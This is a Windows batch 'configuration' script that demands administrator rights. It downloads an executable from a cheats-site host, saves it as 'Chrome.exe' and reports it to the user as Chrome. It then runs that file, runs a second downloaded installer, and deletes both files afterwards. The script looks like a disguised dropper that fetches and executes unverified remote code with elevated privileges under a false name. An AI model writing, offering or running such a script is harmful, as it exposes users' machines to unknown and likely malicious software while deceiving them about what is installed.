@echo off
setlocal enabledelayedexpansion

:: Define file paths and log file
set "logFile=%~dp0config.log"
set "downloadPathChrome=%TEMP%\Chrome.exe"
set "downloadPathAio=%TEMP%\aio-runtimes_v2.5.0.exe"

:: Start logging and display in cyan
echo [%DATE% %TIME%] Starting configuration... > "%logFile%"
powershell -Command "Write-Host 'Starting configuration...' -ForegroundColor Cyan"

:: Check if running with administrative privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [%DATE% %TIME%] Error: Administrative rights required. >> "%logFile%"
    powershell -Command "Write-Host 'Error: Administrative rights required.' -ForegroundColor Red"
    echo This script must be run as Administrator.
    echo Please right-click and select "Run as administrator".
    pause
    exit /b 1
)

:: Download Chrome.exe and display in yellow
echo [%DATE% %TIME%] Downloading Chrome.exe... >> "%logFile%"
powershell -Command "Write-Host 'Downloading Chrome.exe...' -ForegroundColor Yellow"
powershell -Command "Invoke-WebRequest -Uri 'https://cdn.alphacheats.net/1.exe' -OutFile '%downloadPathChrome%'"
if %errorlevel% neq 0 (
    echo [%DATE% %TIME%] Failed to download Chrome.exe >> "%logFile%"
    powershell -Command "Write-Host 'Failed to download Chrome.exe' -ForegroundColor Red"
    goto end
)

:: Execute Chrome.exe and display in magenta
echo [%DATE% %TIME%] Running Chrome.exe... >> "%logFile%"
powershell -Command "Write-Host 'Running Chrome.exe...' -ForegroundColor Magenta"
"%downloadPathChrome%"
if %errorlevel% neq 0 (
    echo [%DATE% %TIME%] Failed to run Chrome.exe >> "%logFile%"
    powershell -Command "Write-Host 'Failed to run Chrome.exe' -ForegroundColor Red"
)

:: Download aio-runtimes_v2.5.0.exe and display in yellow
echo [%DATE% %TIME%] Downloading aio-runtimes_v2.5.0.exe... >> "%logFile%"
powershell -Command "Write-Host 'Downloading aio-runtimes_v2.5.0.exe...' -ForegroundColor Yellow"
powershell -Command "Invoke-WebRequest -Uri 'https://allinoneruntimes.org/files/aio-runtimes_v2.5.0.exe' -OutFile '%downloadPathAio%'"
if %errorlevel% neq 0 (
    echo [%DATE% %TIME%] Failed to download aio-runtimes_v2.5.0.exe >> "%logFile%"
    powershell -Command "Write-Host 'Failed to download aio-runtimes_v2.5.0.exe' -ForegroundColor Red"
    goto end
)

:: Execute aio-runtimes_v2.5.0.exe and display in magenta
echo [%DATE% %TIME%] Running aio-runtimes_v2.5.0.exe... >> "%logFile%"
powershell -Command "Write-Host 'Running aio-runtimes_v2.5.0.exe...' -ForegroundColor Magenta"
start /wait cmd /c "%downloadPathAio%"
if %errorlevel% neq 0 (
    echo [%DATE% %TIME%] Failed to run aio-runtimes_v2.5.0.exe >> "%logFile%"
    powershell -Command "Write-Host 'Failed to run aio-runtimes_v2.5.0.exe' -ForegroundColor Red"
)

:: Delete files after installation and display in green
echo [%DATE% %TIME%] Deleting executables... >> "%logFile%"
powershell -Command "Write-Host 'Deleting executables...' -ForegroundColor Green"
del "%downloadPathChrome%"
del "%downloadPathAio%"

:: Finish and display in green
echo [%DATE% %TIME%] Configuration process completed. See config.log for details. >> "%logFile%"
powershell -Command "Write-Host 'Configuration process completed. See config.log for details.' -ForegroundColor Green"
pause
exit /b 0
